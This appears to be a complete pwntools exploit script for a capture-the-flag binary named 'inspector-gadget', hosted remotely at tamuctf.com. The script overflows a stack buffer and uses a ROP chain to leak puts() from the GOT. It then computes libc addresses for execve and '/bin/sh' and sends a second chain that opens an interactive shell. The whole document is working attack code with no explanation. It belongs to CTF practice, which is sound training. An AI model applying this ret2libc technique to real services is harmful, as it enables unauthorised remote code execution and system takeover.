from pwn import *

context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./inspector-gadget")
#libc = ELF("")
#env = {"LD_PRELOAD": "./libc.so.6"}

p = remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")

#p = gdb.debug("./inspector-gadget", gdbscript='''
#b *main
#b *pwnme+32''')

p.recvline()
p.recvline()

pad_A = b'A' * 24
pad_B = b'B' * 24
pad_C = b'C' * 8
puts_got = 0x404018
puts_plt = 0x4011f0
pop_rdi = 0x40127b
pop_rsi_r15 = 0x401279
ret = 0x40127c

pwnme = 0x00000000004011a3


p.sendline(pad_A + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(pwnme) + p64(ret))
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))

print('puts() leak: ', hex(puts_leak))

libc_execve = puts_leak + 347744
libc_binsh = puts_leak + 1108716
libc_pop_rdx = puts_leak + 231042

print('execve() leak: ', hex(libc_execve))
print('/bin/sh leak: ', hex(libc_binsh))
print('pop_rdx leak: ', hex(libc_pop_rdx))



p.sendline(pad_B + p64(pop_rdi) + p64(libc_binsh) + p64(pop_rsi_r15) + p64(0x0) + p64(0x0) + p64(libc_pop_rdx) + p64(0x0) + p64(libc_execve))

p.interactive()
